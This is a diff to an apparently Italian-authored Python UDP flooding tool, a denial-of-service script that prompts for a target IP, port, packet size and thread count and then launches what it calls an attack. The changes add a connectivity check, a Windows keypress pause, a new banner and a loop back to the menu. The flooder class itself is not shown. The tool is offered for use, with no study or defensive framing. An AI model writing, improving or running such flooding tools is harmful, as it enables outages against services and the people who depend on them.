@@ -1,15 +1,23 @@
 #!/usr/bin/env python3
-from socket import socket, AF_INET, SOCK_DGRAM
+from socket import socket, AF_INET, SOCK_DGRAM, create_connection
 from threading import Thread
 import os
 from random import randint
 from time import time, sleep
-from getpass import getpass as hinput
+import msvcrt  # Per la pausa su Windows
 import colorama
 from colorama import Fore, Style
 
 # Inizializza colorama
 colorama.init(autoreset=True)
+
+def check_internet_connection(host="8.8.8.8", port=53, timeout=3):
+    """Verifica se c'è connessione a Internet tentando di connettersi a un server DNS pubblico."""
+    try:
+        create_connection((host, port), timeout)
+        return True
+    except OSError:
+        return False
 
 def clear_screen():
     """Pulisce il terminale."""
@@ -43,6 +51,11 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
                               X. 9  `   '  P )X
                               `b  `       '  d'
                                `             '
+                             ▐ ▄        ▌ ▐· ▄▄▄· 
+                            •█▌▐█▪     ▪█·█▌▐█ ▀█ 
+                            ▐█▐▐▌ ▄█▀▄ ▐█▐█•▄█▀▀█ 
+                            ██▐█▌▐█▌.▐▌ ███ ▐█ ▪▐▌
+                            ▀▀ █▪ ▀█▄▀▪. ▀   ▀  ▀ 
     """
     print(Fore.RED + banner + Style.RESET_ALL)
 
@@ -111,35 +124,52 @@ def get_input(prompt, default=None, cast_type=int):
         print(Fore.RED + f"Invalid input. Please enter a valid {cast_type.__name__}." + Style.RESET_ALL)
         return get_input(prompt, default, cast_type)
 
+def wait_for_keypress():
+    """Attende che l'utente prema un tasto per tornare alla schermata iniziale."""
+    print(Fore.YELLOW + "\nPress any key to return to the main screen..." + Style.RESET_ALL)
+    msvcrt.getch()  # Aspetta un input qualsiasi
+
 def main():
-    clear_screen()
-    print_banner()
-    print_divider()
-    print()  # Spazio extra dopo il banner
-
-    # Input utente
-    ip = input(Fore.LIGHTBLUE_EX + "Enter the target IP address: " + Style.RESET_ALL)
-    if not ip.count('.') == 3:
-        print(Fore.RED + "Error! Please enter a valid IP address." + Style.RESET_ALL)
-        return
-
-    port = get_input("Enter the target port (or press enter to target all ports): ", default=None, cast_type=int)
-    packet_size = get_input("Enter the packet size in bytes (default is 1250): ", default=1250)
-    thread_count = get_input("Enter the number of threads (default is 100): ", default=100)
-
-    flooder = UDPFlooder(ip, port, packet_size, thread_count)
-    
-    try:
-        flooder.start_flood()
+    while True:
+        clear_screen()
+        print_banner()
         print_divider()
-        print(Fore.LIGHTBLUE_EX + f"Starting attack on {ip}:{port if port else 'all ports'}" + Style.RESET_ALL)
-        print_divider()
-        while True:
-            sleep(1000000)
-    except KeyboardInterrupt:
-        flooder.stop_flood()
-        print("\n" + Fore.RED + f"Attack stopped. Total data sent: {flooder.sent_bytes / (1024 * 1024 * 1024):.2f} Gb" + Style.RESET_ALL)
-        print_divider()
+        print()  # Spazio extra dopo il banner
+
+        # Input utente
+        ip = input(Fore.LIGHTBLUE_EX + "Enter the target IP address: " + Style.RESET_ALL)
+        if not ip.count('.') == 3:
+            print(Fore.RED + "Error! Please enter a valid IP address." + Style.RESET_ALL)
+            wait_for_keypress()
+            continue
+
+        port = get_input("Enter the target port (or press enter to target all ports): ", default=None, cast_type=int)
+        packet_size = get_input("Enter the packet size in bytes (default is 1250): ", default=1250)
+        thread_count = get_input("Enter the number of threads (default is 100): ", default=100)
+
+        # Controllo connessione internet
+        print(Fore.YELLOW + "\nChecking internet connection..." + Style.RESET_ALL)
+        if check_internet_connection():
+            print(Fore.GREEN + "Internet connection verified. Proceeding..." + Style.RESET_ALL)
+        else:
+            print(Fore.RED + "No internet connection detected! Exiting..." + Style.RESET_ALL)
+            wait_for_keypress()
+            continue  # Torna al menu principale
+
+        flooder = UDPFlooder(ip, port, packet_size, thread_count)
+        
+        try:
+            flooder.start_flood()
+            print_divider()
+            print(Fore.LIGHTBLUE_EX + f"Starting attack on {ip}:{port if port else 'all ports'}" + Style.RESET_ALL)
+            print_divider()
+            while True:
+                sleep(1000000)
+        except KeyboardInterrupt:
+            flooder.stop_flood()
+            print("\n" + Fore.RED + f"Attack stopped. Total data sent: {flooder.sent_bytes / (1024 * 1024 * 1024):.2f} Gb" + Style.RESET_ALL)
+            print_divider()
+            wait_for_keypress()
 
 if __name__ == '__main__':
     main()
